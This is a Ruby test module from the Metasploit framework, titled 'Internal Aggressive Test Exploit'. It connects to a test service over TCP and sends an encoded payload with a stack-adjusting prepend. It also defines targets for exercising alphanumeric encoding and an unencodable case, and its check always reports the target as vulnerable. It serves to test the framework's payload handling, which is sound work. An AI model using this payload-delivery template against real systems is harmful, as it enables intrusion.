require 'msf/core'

module Msf

class Exploits::Test::Multi::Aggressive < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Internal Aggressive Test Exploit',
			'Description'    => 	
				"This module tests the exploitation of a test service.",
			'Author'         => 'skape',
			'License'        => GPL_LICENSE,
			'Version'        => '$Revision$',
			'Payload'        =>
				{
					'Space'    => 1000,
					'MaxNops'  => 0,
					'BadChars' => "\x00",
					'Prepend'  => "\x81\xc4\x54\xf2\xff\xff", # add esp, -3500
				},
			'Targets'        => 
				[
					# Target 0: Universal
					[ 
						'Any Platform',
						{
							'Platform' => [ 'linux', 'win' ]
						}
					],
					[
						'Test encoder specific',
						{
							'Platform' => [ 'linux', 'win' ],
							'Payload'  =>
								{
									'EncoderType'    => Msf::Encoder::Type::AlphanumUpper,
									'EncoderOptions' =>
										{
											'BufferRegister' => 'EBX',
											'BufferOffset'   => 4
										}
								}
						},
					],
					[
						'Cannot be encoded',
						{
							'Platform' => [ 'linux', 'win' ],
							'Payload'  => 
								{
									'BadChars' => (0..255).to_a.map { |x| x.chr }.to_s
								}
						}
					],
				],
			'DefaultTarget' => 0))

		register_options(
			[
				OptBool.new('WaitForInput', [ false, "Wait for user input before returning from exploit", false ])
			])
	end

	def check
		return Exploit::CheckCode::Vulnerable
	end

	def exploit
		connect

		print_status("Sending #{payload.encoded.length} byte payload...")

		sock.put(payload.encoded)

		if (datastore['WaitForInput'])
			puts "Type something..."
			gets
		end

		handler
	end

end

end
